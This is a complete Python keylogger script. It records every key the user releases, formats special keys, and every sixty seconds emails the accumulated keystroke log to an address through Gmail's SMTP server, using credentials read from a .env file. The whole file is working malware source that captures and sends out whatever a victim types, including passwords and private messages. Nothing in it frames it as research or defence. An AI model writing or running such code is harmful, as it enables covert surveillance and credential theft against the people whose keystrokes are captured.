import os
from dotenv import load_dotenv
import keyboard
import smtplib
from threading import Timer

# Load environment variables from .env file
load_dotenv()

# Get credentials from .env file
EMAIL = os.getenv('EMAIL')
PASSWORD = os.getenv('PASSWORD')
INTERVAL = 60  # Interval in seconds for sending logs

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ''

    def callback(self, event):
        name = event.name
        if len(name) > 1:  # Handle special keys
            if name == 'space':
                name = ' '
            elif name == 'enter':
                name = '[ENTER]\n'
            elif name == 'decimal':
                name = '.'
            else:
                name = f'[{name.upper()}]'
        self.log += name

    def sendmail(self, email, password, message):
        try:
            server = smtplib.SMTP(host='smtp.gmail.com', port=587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, message)
            server.quit()
        except Exception as e:
            print(f"Failed to send email: {e}")

    def report(self):
        if self.log:
            print(f"Sending log: {self.log}")  # Debug log
            self.sendmail(EMAIL, PASSWORD, self.log)
        self.log = ''
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()

if __name__ == '__main__':
    keylogger = Keylogger(interval=INTERVAL)
    keylogger.start()
